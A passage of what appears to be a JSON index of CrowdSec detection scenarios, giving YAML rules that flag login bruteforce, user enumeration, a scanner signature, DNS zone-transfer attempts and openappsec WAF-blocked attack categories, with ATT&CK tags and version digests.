true\nlabels:\n  service: keycloak\n  confidence: 3\n  spoofable: 0\n  classification:\n    - attack.T1110\n  label: \"Keycloak Bruteforce\"\n  behavior: \"http:bruteforce\"\n  remediation: true\n---\ntype: leaky\nname: inherent-io/keycloak-user-enum-bf\ndescription: \"Detect keycloak user enum bruteforce\"\nfilter: evt.Meta.service == \"keycloak\" && evt.Meta.error in ['user_not_found', 'invalid_user_credentials']\nleakspeed: \"10s\"\ncapacity: 5\ngroupby: evt.Meta.source_ip\ndistinct: evt.Meta.username\nblackhole: 1m\nreprocess: true\nlabels:\n  service: keycloak\n  confidence: 3\n  spoofable: 0\n  classification:\n    - attack.T1589\n  label: \"Keycloak Bruteforce\"\n  behavior: \"http:bruteforce\"\n  remediation: true\n", "description": "Detect keycloak bruteforce", "path": "scenarios/inherent-io/keycloak-bf.yaml", "version": "0.3", "versions": {"0.1": {"digest": "e49641024ac18c51c5f562e9f1c4a60ec31e0ef0525f5754537bc7ac8a425ddb"}, "0.2": {"digest": "ae82c46c8629fc58402e4b86bed8b8099c04484fb9acf5d29b5d293690056a15"}, "0.3": {"digest": "4042f61ec012d1a400d330da365880acb37dab889bc051dc165e005c743b04be"}}}, "inherent-io/keycloak-slow-bf": {"content": "type: leaky\nname: inherent-io/keycloak-slow-bf\ndescription: \"Detect keycloak bruteforce\"\nfilter: evt.Meta.service == \"keycloak\" && evt.Meta.error in ['user_not_found', 'invalid_user_credentials']\nleakspeed: \"60s\"\ncapacity: 10\ngroupby: evt.Meta.source_ip\nblackhole: 1m\nreprocess: true\nlabels:\n  service: keycloak\n  confidence: 3\n  spoofable: 0\n  classification:\n    - attack.T1110\n  label: \"Keycloak Bruteforce\"\n  behavior: \"http:bruteforce\"\n  remediation: true\n---\ntype: leaky\nname: inherent-io/keycloak-user-enum-slow-bf\ndescription: \"Detect keycloak user enum bruteforce\"\nfilter: evt.Meta.service == \"keycloak\" && evt.Meta.error in ['user_not_found', 'invalid_user_credentials']\nleakspeed: \"60s\"\ncapacity: 10\ngroupby: evt.Meta.source_ip\ndistinct: evt.Meta.username\nblackhole: 1m\nreprocess: true\nlabels:\n  service: keycloak\n  confidence: 3\n  spoofable: 0\n  classification:\n    - attack.T1589\n  label: \"Keycloak Bruteforce\"\n  behavior: \"http:bruteforce\"\n  remediation: true\n", "description": "Detect keycloak bruteforce", "path": "scenarios/inherent-io/keycloak-slow-bf.yaml", "version": "0.3", "versions": {"0.1": {"digest": "14928e0df7050fa79b4e332f228afc71e287c2a67fefd2c77aab19de99fad70a"}, "0.2": {"digest": "001444d0fbb4395b81e6caf835e8d7c5dde0fd3818c0b7b70d79264ab6453b04"}, "0.3": {"digest": "cc4be12326a155f70b32f816c5521e96ab9fc7715a9bdecd33615fc7ba53f84a"}}}, "jbowdre/miniflux-bf": {"content": "# miniflux BF scan\nname: jbowdre/miniflux-bf\ndescription: \"Detect miniflux bruteforce\"\nfilter: \"evt.Meta.log_type == 'miniflux_failed_auth'\"\ntype: leaky\ngroupby: evt.Meta.source_ip\nleakspeed: 20s\ncapacity: 5\nblackhole: 1m\nlabels:\n  service: miniflux\n  confidence: 3\n  spoofable: 0\n  classification:\n    - attack.T1110\n  label: \"Miniflux Bruteforce\"\n  behavior: \"http:bruteforce\"\n  remediation: true\n---\n# miniflux user-enum\ntype: leaky\nname: jbowdre/miniflux-bf_user-enum\ndescription: \"Detect miniflux user enum bruteforce\"\nfilter: \"evt.Meta.log_type == 'miniflux_failed_auth'\"\ngroupby: evt.Meta.source_ip\ndistinct: evt.Meta.user\nleakspeed: 1m\ncapacity: 5\nblackhole: 1m\nlabels:\n  service: miniflux\n  confidence: 3\n  spoofable: 0\n  classification:\n    - attack.T1589\n  label: \"Miniflux Bruteforce\"\n  behavior: \"http:bruteforce\"\n  remediation: true\n\n", "description": "Detect miniflux bruteforce", "path": "scenarios/jbowdre/miniflux-bf.yaml", "version": "0.1", "versions": {"0.1": {"digest": "ca3feff94722b7029e3797f11737233f64b38e3cee1d05125ac1391fc70f4ddf"}}}, "jusabatier/apereo-cas-bf": {"content": "# cas bruteforce\ntype: leaky\nname: jusabatier/apereo-cas-bf\ndescription: \"Detect CAS bruteforce\"\nfilter: \"evt.Meta.log_type == 'cas_failed-auth'\"\nleakspeed: \"10s\"\nreferences:\n  - http://wikipedia.com/cas-bf-is-bad\ncapacity: 5\ngroupby: evt.Meta.source_ip\nblackhole: 1m\nreprocess: true\nlabels:\n  service: http\n  confidence: 3\n  spoofable: 0\n  classification:\n    - attack.T1110\n  behavior: \"http:bruteforce\"\n  label: \"CAS Bruteforce\"\n  remediation: true\n---\n# cas user-enum\ntype: leaky\nname: jusabatier/apereo-cas-bf_user-enum\ndescription: \"Detect CAS user enum bruteforce\"\nfilter: evt.Meta.log_type == 'cas_failed-auth'\ngroupby: evt.Meta.source_ip\ndistinct: evt.Meta.target_user\nleakspeed: 10s\ncapacity: 5\nblackhole: 1m\nlabels:\n  service: http\n  confidence: 3\n  spoofable: 0\n  classification:\n    - attack.T1589\n    - attack.T1110\n  behavior: \"http:bruteforce\"\n  label: \"CAS User Enum Bruteforce\"\n  remediation: true\n", "description": "Detect CAS bruteforce", "path": "scenarios/jusabatier/apereo-cas-bf.yaml", "references": ["http://wikipedia.com/cas-bf-is-bad"], "version": "0.2", "versions": {"0.1": {"digest": "d1bf29f3d7bbf0a7bee0a9e0dddc953c9f0cad2ac4f5d6dcefe7d8ae3dc833a6"}, "0.2": {"digest": "828c0aeff9e1dd41f90b2fb1f83d4d8fb1bd6812045e30f19f772cb4879dbca1"}}}, "jusabatier/apereo-cas-slow-bf": {"content": "# CAS bruteforce\ntype: leaky\nname: jusabatier/cas-slow-bf\ndescription: \"Detect slow CAS bruteforce\"\nfilter: \"evt.Meta.log_type == 'cas_failed-auth'\"\nleakspeed: \"60s\"\nreferences:\n  - http://wikipedia.com/cas-bf-is-bad\ncapacity: 10\ngroupby: evt.Meta.source_ip\nblackhole: 1m\nreprocess: true\nlabels:\n  service: http\n  confidence: 3\n  spoofable: 0\n  classification:\n    - attack.T1110\n  behavior: \"http:bruteforce\"\n  label: \"CAS Slow Bruteforce\"\n  remediation: true\n---\n# cas user-enum\ntype: leaky\nname: jusabatier/cas-slow-bf_user-enum\ndescription: \"Detect slow CAS user enum bruteforce\"\nfilter: evt.Meta.log_type == 'cas_failed-auth'\ngroupby: evt.Meta.source_ip\ndistinct: evt.Meta.target_user\nleakspeed: 60s\ncapacity: 10\nblackhole: 1m\nlabels:\n  service: http\n  confidence: 3\n  spoofable: 0\n  classification:\n    - attack.T1589\n    - attack.T1110\n  behavior: \"http:bruteforce\"\n  label: \"CAS Slow User Enum Bruteforce\"\n  remediation: true\n", "description": "Detect slow CAS bruteforce", "path": "scenarios/jusabatier/apereo-cas-slow-bf.yaml", "references": ["http://wikipedia.com/cas-bf-is-bad"], "version": "0.2", "versions": {"0.1": {"digest": "4bcde74a3f00abede206b5821669531c8ebfbf80b79530414050bfd3ccbfc6f9"}, "0.2": {"digest": "272deed2d9f9f5e4a49364246a92c1cd826daa49d77717de71b9e5688059f87e"}}}, "jusabatier/cas-slow-bf": {"content": "# CAS bruteforce\ntype: leaky\nname: jusabatier/apereo-cas-slow-bf\ndescription: \"Detect slow CAS bruteforce\"\nfilter: \"evt.Meta.log_type == 'cas_failed-auth'\"\nleakspeed: \"60s\"\nreferences:\n  - http://wikipedia.com/cas-bf-is-bad\ncapacity: 10\ngroupby: evt.Meta.source_ip\nblackhole: 1m\nreprocess: true\nlabels:\n  service: http\n  confidence: 3\n  spoofable: 0\n  classification:\n    - attack.T1110\n    - attack.T1595\n  behavior: \"http:bruteforce\"\n  label: \"Apereo CAS Bruteforce\"\n  remediation: true\n---\n# cas user-enum\ntype: leaky\nname: jusabatier/apereo-cas-slow-bf_user-enum\ndescription: \"Detect slow CAS user enum bruteforce\"\nfilter: evt.Meta.log_type == 'cas_failed-auth'\ngroupby: evt.Meta.source_ip\ndistinct: evt.Meta.target_user\nleakspeed: 60s\ncapacity: 10\nblackhole: 1m\nlabels:\n  service: http\n  confidence: 3\n  spoofable: 0\n  classification:\n    - attack.T1110\n    - attack.T1595\n  behavior: \"http:bruteforce\"\n  label: \"Apereo CAS Slow User Enum Bruteforce\"\n  remediation: true\n", "description": "Detect slow CAS bruteforce", "path": "scenarios/jusabatier/cas-slow-bf.yaml", "references": ["http://wikipedia.com/cas-bf-is-bad"], "version": "0.2", "versions": {"0.1": {"digest": "6279c83e01b94e7d87271e16118d6b06be9662873c941884a12038fa7adc76c1"}, "0.2": {"digest": "49a43e695621ca9c777d8825d67a7354da4012d94320740c39adf786d76b9028"}}}, "lourys/pterodactyl-wings-bf": {"content": "####################\n## Invalid format ##\n####################\ntype: leaky\nname: lourys/pterodactyl-wings-bf\ndescription: \"Detect invalid_format ssh bruteforce\"\nfilter: \"evt.Meta.log_type == 'pterodactly_wings_invalid_format'\"\nleakspeed: 15m\ncapacity: 5\ngroupby: evt.Meta.source_ip\nblackhole: 30m\nreprocess: true\nlabels:\n  service: pterodactyl\n  classification:\n    - attack.T1110\n  spoofable: 0\n  confidence: 3\n  behavior: \"ssh:bruteforce\"\n  label: \"Pterodactyl Wing Bruteforce\"\n  remediation: true\n---\ntype: leaky\nname: lourys/pterodactyl-wings-bf\ndescription: \"Detect invalid_format ssh user enum bruteforce\"\nfilter: evt.Meta.log_type == 'pterodactly_wings_invalid_format'\ngroupby: evt.Meta.source_ip\ndistinct: evt.Meta.target_user\nleakspeed: 15m\ncapacity: 5\nblackhole: 30m\nlabels:\n  service: pterodactyl\n  classification:\n    - attack.T1087\n  spoofable: 0\n  confidence: 3\n  behavior: \"ssh:bruteforce\"\n  label: \"Pterodactyl Wing Bruteforce\"\n  remediation: true\n\n###############################\n## Invalid username/password ##\n###############################\n---\ntype: leaky\nname: lourys/pterodactyl-wings-bf\ndescription: \"Detect invalid_username_or_password ssh bruteforce\"\nfilter: evt.Meta.log_type == 'pterodactly_wings_invalid_username_or_password'\ngroupby: evt.Meta.source_ip\nleakspeed: 5m\ncapacity: 10\nblackhole: 5m\nlabels:\n  service: pterodactyl\n  classification:\n    - attack.T1110\n  spoofable: 0\n  confidence: 3\n  behavior: \"ssh:bruteforce\"\n  label: \"Pterodactyl Wing Bruteforce\"\n  remediation: true\n", "description": "Detect invalid_format ssh bruteforce", "path": "scenarios/lourys/pterodactyl-wings-bf.yaml", "version": "0.4", "versions": {"0.1": {"digest": "05da99b5df02bed22d6627edd06897404a53ed13f9033b79cdf7b9cc21538cbe"}, "0.2": {"digest": "4837e97a679e794ebd2d2a90028a2c649748a5ffbf1a27c286b799214bc40222"}, "0.3": {"digest": "55b6dc21a6ecbff059805e5c399c9f3ed7aaeae00890e0ac9615123a3533cfc5"}, "0.4": {"digest": "a669d9e69d703728c029f162bad5c3a3d45b29fe15cd7b36f7f16b74fef18113"}}}, "ltsich/http-w00tw00t": {"content": "#contributed by ltsich\ntype: trigger\nname: ltsich/http-w00tw00t\ndescription: \"detect w00tw00t\"\ndebug: false\nfilter: \"evt.Meta.log_type == 'http_access-log' and (\n  evt.Parsed.file_name contains 'w00tw00t.at.ISC.SANS.DFind' or\n  Lower(evt.Meta.http_path) == '/core/skin/login.aspx'\n  )\"\ngroupby: evt.Meta.source_ip\nblackhole: 5m\nlabels:\n  service: http\n  classification:\n    - attack.T1595\n  spoofable: 0\n  confidence: 3\n  behavior: \"http:scan\"\n  label: \"w00t w00t Scanner\"\n  remediation: true\n", "description": "detect w00tw00t", "path": "scenarios/ltsich/http-w00tw00t.yaml", "version": "0.3", "versions": {"0.1": {"digest": "f0cba1520658a1016e9d1952473fa9e78175deef2117d2b921e7d994a6e7a549"}, "0.2": {"digest": "6327526c8c38490c33a5441ad144d35ad3bfc49b309194b2c437a178cf95908b"}, "0.3": {"digest": "4399164e4836ad114f4a21e99e37c8d278e51076d9760d0ca6ae709f4ba853d2"}}}, "mstilkerich/bind9-refused": {"content": "type: leaky\nname: mstilkerich/bind9-refused\ndescription: \"Act on queries / zone transfers denied by bind9 policy\"\ndebug: false\nfilter: \"evt.Meta.log_type == 'bind9_denied'\"\ngroupby: evt.Meta.source_ip\ncapacity: 5\nleakspeed: 10s\nblackhole: 1m\nlabels:\n  service: domain\n  classification:\n    - attack.T1590.002\n  spoofable: 0\n  confidence: 3\n  behavior: \"generic:scan\"\n  label: \"Domain transfer attempt\"\n  remediation: true\n", "description": "Act on queries / zone transfers denied by bind9 policy", "path": "scenarios/mstilkerich/bind9-refused.yaml", "version": "0.2", "versions": {"0.1": {"digest": "16ff798ce0bde3b31c91eed4d3b022b70ccbe723579ab80ac889880058a50d20"}, "0.2": {"digest": "a7567674f1b50c578195fa8e6a95c99e9573598c63720c8ae3b585ff492aa91e"}}}, "mwinters-stuff/mailu-admin-bf": {"content": "# mailu-admin bruteforce\ntype: trigger\n# debug: true\nname: mwinters-stuff/mailu-admin-bf\ndescription: \"Detect mailu admin bruteforce\"\nfilter: evt.Meta.log_type == 'mailu_admin_auth_attempt'\ngroupby: evt.Meta.source_ip\nblackhole: 5m\n# reprocess: true\nlabels:\n  service: http\n  classification:\n    - attack.T1110.001\n  spoofable: 0\n  confidence: 3\n  behavior: \"http:bruteforce\"\n  label: \"Mailu web admin authentication attempt\"\n  remediation: true\n", "description": "Detect mailu admin bruteforce", "path": "scenarios/mwinters-stuff/mailu-admin-bf.yaml", "version": "0.2", "versions": {"0.1": {"digest": "f5f64aea87e23bec59055bd1d701aa190de5c77edb2b8b23baf98176ff544515"}, "0.2": {"digest": "67f3eb683565052c8d13cb3cac78d34e79895310a97a3bc487a4db016627f386"}}}, "openappsec/openappsec-bot-protection": {"content": "type: trigger\n#debug: true\nname: openappsec/openappsec-bot-protection\ndescription: \"Detect openappsec 'prevent' securityActions on 'Bot Protection' events (when waf blocks malicious request)\"\nfilter: evt.Meta.log_type == 'openappsec_security_log' and Lower(evt.Meta.security_action) in ['prevent', 'detect'] and Lower(evt.Meta.incident_type) contains 'bot protection'\ngroupby: evt.Meta.source_ip\nblackhole: 5m\nlabels:\n  service: http\n  classification:\n    - attack.T1595\n    - attack.T1190\n  spoofable: 0\n  confidence: 2\n  behavior: \"http:spam\"\n  label: \"Openappsec 'Bot Protection' detection\"\n  remediation: true\n", "description": "Detect openappsec 'prevent' securityActions on 'Bot Protection' events (when waf blocks malicious request)", "path": "scenarios/openappsec/openappsec-bot-protection.yaml", "version": "0.2", "versions": {"0.1": {"digest": "359fa8bc8cbcba17f082b9dd0ff714bee45f7b4f1428a81bddfc98d7d379e8be"}, "0.2": {"digest": "131dcf6809a4df02095cb2f1ad9cf85372b4b318823a63ef1a817a440652c91b"}}}, "openappsec/openappsec-cross-site-redirect": {"content": "type: trigger\n#debug: true\nname: openappsec/openappsec-cross-site-redirect\ndescription: \"Detect openappsec 'prevent' securityActions on 'Cross Site Redirect' events (when waf blocks malicious request)\"\nfilter: evt.Meta.log_type == 'openappsec_security_log' and Lower(evt.Meta.security_action) in ['prevent', 'detect'] and Lower(evt.Meta.incident_type) contains 'cross site redirect'\ngroupby: evt.Meta.source_ip\nblackhole: 5m\nlabels:\n  service: http\n  classification:\n    - attack.T1566\n  spoofable: 0\n  confidence: 2\n  behavior: \"http:exploit\"\n  label: \"Openappsec 'cross site redirect' detection\"\n  remediation: true\n", "description": "Detect openappsec 'prevent' securityActions on 'Cross Site Redirect' events (when waf blocks malicious request)", "path": "scenarios/openappsec/openappsec-cross-site-redirect.yaml", "version": "0.2", "versions": {"0.1": {"digest": "1d6a3d6144b9c31b384161674f4d6aa9f19ac200c5e8f608539a8d0f4a316f6b"}, "0.2": {"digest": "883d8ef5392e68b80b4ee7ebb9ac34f087069f077a46fbe48433871c0ed9dc8f"}}}, "openappsec/openappsec-csrf": {"content": "type: trigger\n#debug: true\nname: openappsec/openappsec-csrf\ndescription: \"Detect openappsec 'prevent' securityActions on 'Cross Site Request Forgery' events (when waf blocks malicious request)\"\nfilter: evt.Meta.log_type == 'openappsec_security_log' and Lower(evt.Meta.security_action) in ['prevent', 'detect'] and Lower(evt.Meta.incident_type) contains 'cross site request forgery'\ngroupby: evt.Meta.source_ip\nblackhole: 5m\nlabels:\n  service: http\n  classification:\n    - attack.T1189\n  confidence: 2\n  spoofable: 0\n  behavior: \"http:exploit\"\n  label: \"Openappsec 'cross site request forgery' detection\"\n  remediation: true\n", "description": "Detect openappsec 'prevent' securityActions on 'Cross Site Request Forgery' events (when waf blocks malicious request)", "path": "scenarios/openappsec/openappsec-csrf.yaml", "version": "0.2", "versions": {"0.1": {"digest": "0ba2cee3113519c489e5a59ca436a776acb6039a6feae4b96ac1ae9b80bc17ff"}, "0.2": {"digest": "9a0e799668d2feac96fbdee3195657c5f53d42036bb9c356639b662045a1a122"}}}, "openappsec/openappsec-error-disclosure": {"content": "type: trigger\n#debug: true\nname: openappsec/openappsec-error-disclosure\ndescription: \"Detect openappsec 'prevent' securityActions on 'Error Disclosure' events (when waf blocks malicious request)\"\nfilter: evt.Meta.log_type == 'openappsec_security_log' and Lower(evt.Meta.security_action) in ['prevent', 'detect'] and Lower(evt.Meta.incident_type) contains 'error disclosure'\ngroupby: evt.Meta.source_ip\nblackhole: 5m\nlabels:\n  service: http\n  classification:\n    - attack.T1595\n    - attack.T1190\n  spoofable: 1\n  confidence: 1\n  behavior: \"http:scan\"\n  label: \"Openappsec 'error disclosure' detection\"\n  remediation: true\n", "description": "Detect openappsec 'prevent' securityActions on 'Error Disclosure' events (when waf blocks malicious request)", "path": "scenarios/openappsec/openappsec-error-disclosure.yaml", "version": "0.2", "versions": {"0.1": {"digest": "f80c4a142337e7282fcd356b7fd8163d9bd5931ef0f118b33a03529042599d23"}, "0.2": {"digest": "fc81a79b1c8063f5b63381c211294e3793e8072fc871e208b1fcc62800904d34"}}}, "openappsec/openappsec-error-limit": {"content": "type: trigger\n#debug: true\nname: openappsec/openappsec-error-limit\ndescription: \"Detect openappsec 'prevent' securityActions on 'Error Limit' events (when waf blocks malicious request)\"\nfilter: evt.Meta.log_type == 'openappsec_security_log' and Lower(evt.Meta.security_action) in ['prevent', 'detect'] and Lower(evt.Meta.incident_type) contains 'error limit'\ngroupby: evt.Meta.source_ip\nblackhole: 5m\nlabels:\n  service: http\n  classification:\n    - attack.T1595\n    - attack.T1190\n  spoofable: 1\n  confidence: 1\n  behavior: \"http:bruteforce\"\n  label: \"Openappsec 'error limit' detection\"\n  remediation: true\n", "description": "Detect openappsec 'prevent' securityActions on 'Error Limit' events (when waf blocks malicious request)", "path": "scenarios/openappsec/openappsec-error-limit.yaml", "version": "0.2", "versions": {"0.1": {"digest": "dadb5af9a8635ad6e0194fd8a879b8ef7a8b17f24f4eb451096274a2fc173a6e"}, "0.2": {"digest": "890e27e4725874b45aa18a0df5e1e83a7621bdb2bb3a9c073ba085844d8a8012"}}}, "openappsec/openappsec-evasion-techniques": {"content": "type: trigger\n#debug: true\nname: openappsec/openappsec-evasion-techniques\ndescription: \"Detect openappsec 'prevent' securityActions on 'Evasion Techniques' events (when waf blocks malicious request)\"\nfilter: evt.Meta.log_type == 'openappsec_security_log' and Lower(evt.Meta.security_action) in ['prevent', 'detect'] and Lower(evt.Meta.incident_type) contains 'evasion techniques'\ngroupby: evt.Meta.source_ip\nblackhole: 5m\nlabels:\n  service: http\n  classification:\n    - attack.T1595\n    - attack.T1190\n  spoofable: 0\n  confidence: 1\n  behavior: \"http:exploit\"\n  label: \"Openappsec 'Evasion Techniques' detection\"\n  remediation: true\n", "description": "Detect openappsec 'prevent' securityActions on 'Evasion Techniques' events (when waf blocks malicious request)", "path": "scenarios/openappsec/openappsec-evasion-techniques.yaml", "version": "0.2", "versions": {"0.1": {"digest": "65dba84b391cef5817a1d6ce4e15335f9dfb9494ee95818c43dcf56069b39800"}, "0.2": {"digest": "d3561fcdcec8f943aa5bbeb7d5b8c80b782c71ad70b6891f570b050e70954956"}}}, "openappsec/openappsec-general": {"content": "type: trigger\n#debug: true\nname: openappsec/openappsec-general\ndescription: \"Detect openappsec 'prevent' securityActions on 'General' events (when waf blocks malicious request)\"\nfilter: evt.Meta.log_type == 'openappsec_security_log' and Lower(evt.Meta.security_action) in ['prevent', 'detect'] and Lower(evt.Meta.incident_type) contains 'general'\ngroupby: evt.Meta.source_ip\nblackhole: 5m\nlabels:\n  service: http\n  classification:\n    - attack.T1595\n    - attack.T1190\n  spoofable: 0\n  confidence: 1\n  behavior: \"http:exploit\"\n  label: \"Openappsec 'general' detection\"\n  remediation: true\n", "description": "Detect openappsec 'prevent' securityActions on 'General' events (when waf blocks malicious request)", "path": "scenarios/openappsec/openappsec-general.yaml", "version": "0.2", "versions": {"0.1": {"digest": "957a11028e7acc2818e6211a8e694fcc23456e158de5c4a68b839a497d61bc08"}, "0.2": {"digest": "dab3b58b3a506b4b562b7ef3963a14076c9bc48ef29426bd30a0e19bb7cbecdb"}}}, "openappsec/openappsec-http-limit-violation": {"content": "type: trigger\n#debug: true\nname: openappsec/openappsec-http-limit-violation\ndescription: \"Detect openappsec 'prevent' securityActions on 'Http limit violation' events (when waf blocks malicious request)\"\nfilter: evt.Meta.log_type == 'openappsec_security_log' and Lower(evt.Meta.security_action) in ['prevent', 'detect'] and Lower(evt.Meta.incident_type) contains 'http limit violation'\ngroupby: evt.Meta.source_ip\nblackhole: 5m\nlabels:\n  service: http\n  classification:\n    - attack.T1595\n    - attack.T1190\n  spoofable: 0\n  confidence: 1\n  behavior: \"http:spam\"\n  label: \"Openappsec 'http limit violation' detection\"\n  remediation: true\n", "description": "Detect openappsec 'prevent' securityActions on 'Http limit violation' events (when waf blocks malicious request)", "path": "scenarios/openappsec/openappsec-http-limit-violation.yaml", "version": "0.2", "versions": {"0.1": {"digest": "fb6955f977a48384eaf944a3fa22f197ceb7cd997dc6d871ac8adb0af23b4642"}, "0.2": {"digest": "2050cb2b8128ea8ce53cdc4fa1e43500ef9f11305ee4856a11801044e9f5644e"}}}, "openappsec/openappsec-http-method-violation": {"content": "type: trigger\n#debug: true\nname: openappsec/openappsec-http-method-violation\ndescription: \"Detect openappsec 'prevent' securityActions on 'Illegal http method violation' events (when waf blocks malicious request)\"\nfilter: evt.Meta.log_type == 'openappsec_security_log' and Lower(evt.Meta.security_action) in ['prevent', 'detect'] and Lower(evt.Meta.incident_type) contains 'illegal http method violation'\ngroupby: evt.Meta.source_ip\nblackhole: 5m\nlabels:\n  service: http\n  classification:\n    - attack.T1595\n    - attack.T1190\n  spoofable: 0\n  confidence: 3\n  behavior: \"http:exploit\"\n  label: \"Openappsec 'illegal http method violation' detection\"\n  remediation: true\n", "description": "Detect openappsec 'prevent' securityActions on 'Illegal http method violation' events (when waf blocks malicious request)", "path": "scenarios/openappsec/openappsec-http-method-violation.yaml", "version": "0.2", "versions": {"0.1": {"digest": "1111724d5182ee0e33d275633b9e5230bfab7956f06cda6348593f6eace2df6f"}, "0.2": {"digest": "f4ca829b97b0ee227fd90be71be8fd475eb63f791452ca634ff233e3085530a3"}}}, "openappsec/openappsec-ldap-injection": {"content": "type: trigger\ndebug: false\nname: openappsec/openappsec-ldap-injection\ndescription: \"Detect openappsec 'prevent' securityActions on 'LDAP Injection' events (when waf blocks malicious request)\"\nfilter: evt.Meta.log_type == 'openappsec_security_log' and Lower(evt.Meta.security_action) in ['prevent', 'detect'] and Lower(evt.Meta.incident_type) contains 'ldap injection'\ngroupby: evt.Meta.source_ip\nblackhole: 5m\nlabels:\n  service: http\n  classification:\n    - attack.T1595\n    - attack.T1190\n  spoofable: 0\n  confidence: 2\n  behavior: \"http:exploit\"\n  label: \"Openappsec 'ldap injection' detection\"\n  remediation: true\n", "description": "Detect openappsec 'prevent' securityActions on 'LDAP Injection' events (when waf blocks malicious request)", "path": "scenarios/openappsec/openappsec-ldap-injection.yaml", "version": "0.2", "versions": {"0.1": {"digest": "37056e311beb6d0213db74c273774e30a978d490dc3af7c15db3ec5df20ca752"}, "0.2": {"digest": "042aff245e25ab509b7f578848a97cd2131abe492636126006e323d63b1dd0b3"}}}, "openappsec/openappsec-open-redirect": {"content": "type: trigger\n#debug: true\nname: openappsec/openappsec-open-redirect\ndescription: \"Detect openappsec 'prevent' securityActions on 'Open Redirect' events (when waf blocks malicious request)\"\nfilter: evt.Meta.log_type == 'openappsec_security_log' and Lower(evt.Meta.security_action) in ['prevent', 'detect'] and Lower(evt.Meta.incident_type) contains 'open redirect'\ngroupby: evt.Meta.source_ip\nblackhole: 5m\nlabels:\n  service: http\n  classification:\n    - attack.T1189\n    - attack.T1566\n  spoofable: 0\n  confidence: 2\n  behavior: \"http:exploit\"\n  label: \"Openappsec 'open redirect' detection\"\n  remediation: true\n", "description": "Detect openappsec 'prevent' securityActions on 'Open Redirect' events (when waf blocks malicious request)", "path": "scenarios/openappsec/openappsec-open-redirect.yaml", "version": "0.2", "versions": {"0.1": {"digest": "1fa3254fa19e895e3209d06518d8947ccc895979f425d76c023030b8a2e098ec"}, "0.2": {"digest": "bffcbad62ab71fb63aeba4405fcef5a2d623d9bf98032103ab859837ea478a9b"}}}, "openappsec/openappsec-path-traversal": {"content": "type: trigger\n#debug: true\nname: openappsec/openappsec-path-traversal\ndescription: \"Detect openappsec 'prevent' securityActions on 'Path Traversal' events (when waf blocks malicious request)\"\nfilter: evt.Meta.log_type == 'openappsec_security_log' and Lower(evt.Meta.security_action) in ['prevent', 'detect'] and Lower(evt.Meta.incident_type) contains 'path traversal'\ngroupby: evt.Meta.source_ip\nblackhole: 5m\nlabels:\n  service: http\n  classification:\n    - attack.T1595\n    - attack.T1190\n  spoofable: 0\n  confidence: 2\n  behavior: \"http:exploit\"\n  label: \"Openappsec 'path traversal' detection\"\n  remediation: true\n", "description": "Detect openappsec 'prevent' securityActions on 'Path Traversal' events (when waf blocks malicious request)", "path": "scenarios/openappsec/openappsec-path-traversal.yaml", "version": "0.2", "versions": {"0.1": {"digest": "21763dd00a0bc8970f94dc79a2d0ae5bab8684bc5af503f2d2a6335b0cea68a8"}, "0.2": {"digest": "4cb2b83be3ef0204a5acfa8f7b125fb74c2a017cd202af60d3c1ce3d903ee60c"}}}, "openappsec/openappsec-probing": {"content": "type: trigger\n#debug: true\nname: openappsec/openappsec-probing\ndescription: \"Detect openappsec 'prevent' securityActions on 'Vulnerability Scanning' events (when waf blocks malicious request)\"\nfilter: evt.Meta.log_type == 'openappsec_security_log' and Lower(evt.Meta.security_action) in ['prevent', 'detect'] and Lower(evt.Meta.incident_type) contains 'vulnerability scanning'\ngroupby: evt.Meta.source_ip\nblackhole: 5m\nlabels:\n  service: http\n  classification:\n    - attack.T1595\n    - attack.T1190\n  spoofable: 0\n  confidence: 2\n  behavior: \"http:scan\"\n  label: \"Openappsec 'probing' detection\"\n  remediation: true\n", "description": "Detect openappsec 'prevent' securityActions on 'Vulnerability Scanning' events (when waf blocks malicious request)", "path": "scenarios/openappsec/openappsec-probing.yaml", "version": "0.2", "versions": {"0.1": {"digest": "6add1b1101bbb54c961329ec9b14b160b98b4c24661a7448c8e4469ffb167973"}, "0.2": {"digest": "9de0d6dcba782e7bd114951fe8933710c79743ec858878c53b8d658436967e12"}}}, "openappsec/openappsec-rce": {"content": "type: trigger\ndebug: false\nname: openappsec/openappsec-rce\ndescription: \"Detect openappsec 'prevent' securityActions on 'Remote Code Execution' events (when waf blocks malicious request)\"\nfilter: evt.Meta.log_type == 'openappsec_security_log' and Lower(evt.Meta.security_action) in ['prevent', 'detect'] and Lower(evt.Meta.incident_type) contains 'remote code execution'\ngroupby: evt.Meta.source_ip\nblackhole: 5m\nlabels:\n  service: http\n  classification:\n    - attack.T1595\n    - attack.T1190\n  spoofable: 0\n  confidence: 2\n  behavior: \"http:exploit\"\n  label: \"Openappsec 'rce' detection\"\n  remediation: true\n", "description": "Detect openappsec 'prevent' securityActions on 'Remote Code Execution' events (when waf blocks malicious request)", "path": "scenarios/openappsec/openappsec-rce.yaml", "version": "0.2", "versions": {"0.1": {"digest": "fc5691b14b1d2e38f1fef9f430107a8b31d7825e503ef33c6b11ac9f34c37f62"}, "0.2": {"digest": "a6a032e95fb4d61eb3c19ff5ee263b97f12e72052e9b41222de3758263d5d2cd"}}}, "openappsec/openappsec-request-rate-limit": {"content": "type: trigger\n#debug: true\nname: openappsec/openappsec-request-rate-limit\ndescription: \"Detect openappsec 'prevent' securityActions on 'Request Rate Limit' events (when waf blocks malicious request)\"\nfilter: evt.Meta.log_type == 'openappsec_security_log' and Lower(evt.Meta.security_action) in ['prevent', 'detect'] and Lower(evt.Meta.incident_type) contains 'request rate limit'\ngroupby: evt.Meta.source_ip\nblackhole: 5m\nlabels:\n  service: http\n  classification:\n    - attack.T1498\n  spoofable: 0\n  confidence: 2\n  behavior: \"http:bruteforce\"\n  label: \"Openappsec 'request rate limit' detection\"\n  remediation: true\n", "description": "Detect openappsec 'prevent' securityActions on 'Request Rate Limit' events (when waf blocks malicious request)", "path": "scenarios/openappsec/openappsec-request-rate-limit.yaml", "version": "0.2", "versions": {"0.1": {"digest": "8e915688ead3b21a9660ad94521098df7e152ef74822d96df0d29d09b3625377"}, "0.2": {"digest": "98c6638dda03c0b6ffb29bcb5b09571890eae5c764a0d7ab3c9678d0458680f6"}}}, "openappsec/openappsec-schema-validation": {"content": "type: trigger\n#debug: true\nname: openappsec/openappsec-schema-validation\ndescription: \"Detect openappsec 'prevent' securityActions on 'Schema Validation' events (when waf blocks malicious request)\"\nfilter: evt.Meta.log_type == 'openappsec_security_log' and Lower(evt.Meta.security_action) in ['prevent', 'detect'] and Lower(evt.Meta.incident_type) contains 'schema validation'\ngroupby: evt.Meta.source_ip\nblackhole: 5m\nlabels:\n  service: http\n  classification:\n    - attack.T1190\n  spoofable: 0\n  confidence: 1\n  